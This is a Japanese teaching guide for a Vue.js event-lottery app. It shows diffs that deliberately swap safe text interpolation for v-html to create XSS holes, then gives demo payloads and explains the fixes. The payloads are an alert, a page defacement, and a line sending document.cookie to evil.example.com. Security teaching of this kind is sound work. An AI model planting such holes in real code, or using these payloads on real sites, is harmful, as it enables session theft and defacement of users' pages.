# XSS (クロスサイトスクリプティング) デモガイド

本アプリは教材用のため、意図的にXSS脆弱性を埋め込んでセキュリティ学習に活用できます。
このドキュメントでは、脆弱性の導入方法・デモ手順・修正方法をまとめます。

---

## 1. 脆弱性の導入方法

Vue.js では `{{ }}` (テキスト補間) を使うとHTMLがエスケープされ安全です。
これを `v-html` ディレクティブに変更すると、HTMLがそのままレンダリングされXSSが可能になります。

### 変更対象ファイル (4箇所)

#### `frontend/src/views/AdminPanel.vue`

**イベントタイトル (タブ部分)**

```diff
- <span class="admin-tab-title">{{ ev.title }}</span>
+ <!-- セキュリティ注意: v-htmlはXSSデモ用。本番では使用しないこと -->
+ <span class="admin-tab-title" v-html="ev.title"></span>
```

**応募者氏名 (テーブル部分)**

```diff
- <td>{{ app.name }}</td>
+ <!-- セキュリティ注意: v-htmlはXSSデモ用。本番では使用しないこと -->
+ <td v-html="app.name"></td>
```

#### `frontend/src/views/LotteryResult.vue`

**当選者氏名**

```diff
- <div class="fw-bold">{{ w.name }}</div>
+ <!-- セキュリティ注意: v-htmlはXSSデモ用。本番では使用しないこと -->
+ <div class="fw-bold" v-html="w.name"></div>
```

**落選者氏名**

```diff
- <td>{{ l.name }}</td>
+ <!-- セキュリティ注意: v-htmlはXSSデモ用。本番では使用しないこと -->
+ <td v-html="l.name"></td>
```

---

## 2. デモ手順

### 準備

1. 上記4箇所を `v-html` に変更してアプリを起動
2. ブラウザで `http://localhost:8080` を開く

### 攻撃デモ

1. イベント一覧から任意のイベントを選択
2. 応募フォームの「氏名」欄に以下を入力:

```html
<img src="x" onerror="alert('XSS!')" />
```

3. メールアドレスは適当に入力して応募
4. `/admin` (管理パネル) を開き、該当イベントを選択
5. 応募者一覧にアラートが表示される → **XSS成功**

### その他の攻撃例

```html
<!-- Cookie窃取 -->
<img src="x" onerror="alert(document.cookie)" />

<!-- ページ改ざん -->
<div
  style="position:fixed;top:0;left:0;width:100%;height:100%;background:red;z-index:9999;display:flex;align-items:center;justify-content:center;color:white;font-size:3rem;"
>
  ハッキングされました
</div>

<!-- 外部スクリプト読み込み -->
<img src="x" onerror="fetch('https://evil.example.com?cookie='+document.cookie)" />
```

---

## 3. 解説ポイント

### なぜ危険か

- ユーザー入力がHTMLとして解釈され、任意のJavaScriptが実行可能
- Cookie・セッション情報の窃取、フィッシング、ページ改ざんなどが可能

### Vueにおける安全な書き方

| 書き方           | 安全性 | 用途                                  |
| ---------------- | ------ | ------------------------------------- |
| `{{ value }}`    | 安全   | テキスト表示 (HTMLはエスケープされる) |
| `v-html="value"` | 危険   | HTML描画 (スクリプトも実行される)     |
| `v-text="value"` | 安全   | テキスト表示 (`{{ }}` と同等)         |

### 修正方法

`v-html` → `{{ }}` に戻すだけで修正完了。diffは上記「脆弱性の導入方法」の逆。

---

## 4. 発展的な話題

- **サーバーサイドでの対策**: 入力値のサニタイズ (HTMLタグの除去・エスケープ)
- **CSP (Content Security Policy)**: ヘッダーでスクリプト実行を制限
- **HttpOnly Cookie**: JavaScriptからCookieへのアクセスを防止
- **OWASPトップ10**: XSSは代表的なWebアプリケーション脆弱性の一つ
